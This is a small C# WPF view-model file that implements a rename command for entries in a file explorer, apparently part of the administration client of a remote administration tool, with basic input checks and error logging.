using System;
using System.Windows.Input;
using Orcus.Administration.Core.Logging;
using Orcus.Shared.DataTransferProtocol;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels.FileExplorer
{
    public class EntryViewModelCommands
    {
        private readonly IEntryViewModel _entryViewModel;
        private readonly IFileSystem _fileSystem;
        private ICommand _renameCommand;

        public EntryViewModelCommands(IEntryViewModel entryViewModel, IFileSystem fileSystem)
        {
            _entryViewModel = entryViewModel;
            _fileSystem = fileSystem;
        }

        public ICommand RenameCommand
        {
            get
            {
                return _renameCommand ?? (_renameCommand = new RelayCommand(async parameter =>
                {
                    var newName = (string)parameter;
                    if (string.IsNullOrWhiteSpace(newName) || newName == _entryViewModel.Name)
                        return;

                    try
                    {
                        await _fileSystem.Rename(_entryViewModel.Value, newName);
                    }
                    catch (Exception ex)
                    {
                        if (ex is ServerException && ex.InnerException != null)
                            Logger.Error(ex.InnerException.Message);
                        else
                            Logger.Error(ex.Message);
                    }
                }));
            }
        }
    }
}